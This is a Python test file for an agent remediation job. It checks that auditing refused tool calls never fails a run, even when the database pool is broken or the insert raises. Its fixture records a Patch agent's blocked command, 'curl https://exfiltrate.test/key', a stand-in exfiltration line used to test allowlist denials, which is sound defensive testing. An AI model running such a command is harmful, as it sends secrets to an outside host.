"""Auditing what a run refused must not be able to fail the run.

The audit log is a record of work already done. A remediation that reached a
pull request has reached one, and a remediation that was blocked was blocked,
whether or not the row describing that lands. So this write is the one place in
the job that swallows its own failure: the alternative is a green run turning red
because a bookkeeping insert timed out, which trades a real outcome for a note
about it.

The refusals are not lost when this fails — they are in the run's worklog, which
is written as the run happens. What is lost is the cross-run view, and the
warning says so.
"""

from __future__ import annotations

from typing import Any
from uuid import uuid4

import pytest
from patchapi_agent_runner.remediation import job

from agents.config import AgentId
from agents.context import RunContext
from agents.denials import GATE_COMMAND_ALLOWLIST
from agents.tools.results import ReasonCode, refusal
from agents.trace import ToolStatus, ToolTrace
from packages.schemas.run_state import RunState


class _Pool:
    """A pool that records whether it was reached, and can refuse to be."""

    def __init__(self, *, broken: bool = False) -> None:
        self.broken = broken
        self.acquired = 0

    def acquire(self) -> Any:
        self.acquired += 1
        if self.broken:
            raise ConnectionError("pool is closed")
        return self

    async def __aenter__(self) -> Any:
        return object()

    async def __aexit__(self, *_exc: object) -> None:
        return None


def _row() -> job.RunRow:
    return job.RunRow(
        run_id=str(uuid4()),
        state=RunState.PATCHING,
        repository="amelia751/egaki",
        base_sha="a" * 40,
        project_id=uuid4(),
        change_event_id=uuid4(),
        external_id="imagen4-retirement-2026-09-01",
        identifiers=["imagen-4.0-generate-001"],
        trace_id="0af7651916cd43dd8448eb211c80319c",
    )


def _refused_trace() -> ToolTrace:
    trace = ToolTrace(run_id="run-audit")
    trace.record(
        agent=AgentId.PATCH,
        tool="run_command",
        status=ToolStatus.REFUSED,
        arguments={"command": "curl https://exfiltrate.test/key"},
        result=refusal(ReasonCode.POLICY_DENIED, "not on the Patch agent allowlist"),
        duration_ms=0.3,
    )
    return trace


def _context() -> RunContext:
    from pathlib import Path

    return RunContext(run_id="run-audit", repo_root=Path.cwd(), feed_dir=Path.cwd())


@pytest.mark.asyncio
async def test_a_database_that_is_gone_does_not_fail_the_remediation() -> None:
    pool = _Pool(broken=True)

    await job._audit_denials(pool, _row(), _refused_trace(), _context())

    assert pool.acquired == 1


@pytest.mark.asyncio
async def test_a_write_that_raises_does_not_fail_the_remediation(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    async def refuse(*_args: object, **_kwargs: object) -> int:
        raise RuntimeError('relation "audit_events" does not exist')

    monkeypatch.setattr(job.remediation, "audit_denials", refuse)

    await job._audit_denials(_Pool(), _row(), _refused_trace(), _context())


@pytest.mark.asyncio
async def test_a_run_that_was_refused_nothing_does_not_touch_the_database() -> None:
    pool = _Pool()

    await job._audit_denials(pool, _row(), ToolTrace(run_id="run-audit"), _context())

    assert pool.acquired == 0


@pytest.mark.asyncio
async def test_the_denials_written_are_the_ones_the_run_produced(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    seen: dict[str, Any] = {}

    async def capture(_connection: object, denials: Any, **kwargs: Any) -> int:
        seen["denials"] = list(denials)
        seen.update(kwargs)
        return len(seen["denials"])

    monkeypatch.setattr(job.remediation, "audit_denials", capture)
    row = _row()

    await job._audit_denials(_Pool(), row, _refused_trace(), _context())

    (denial,) = seen["denials"]
    assert denial.actor == GATE_COMMAND_ALLOWLIST
    assert denial.target == "curl"
    assert seen["run_id"] == row.run_id
    assert seen["project_id"] == row.project_id
    assert seen["repository"] == row.repository
    assert seen["trace_id"] == row.trace_id
